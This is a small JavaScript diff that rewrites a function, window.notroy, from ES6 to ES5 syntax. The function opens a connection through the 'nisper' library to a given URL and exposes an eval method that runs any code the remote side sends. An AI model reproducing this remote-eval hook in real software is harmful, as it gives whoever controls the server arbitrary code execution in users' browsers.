@@ -1,11 +1,10 @@
 var nisper = require('nisper')
 
 window.notroy = function (url, id) {
-   
     nisper.default({
-        url: url + `/${id}`,
+        url: url + '/' + id,
         sandbox: {
-            eval(code) {
+            eval: function(code) {
                 return eval(code)
             }
         }
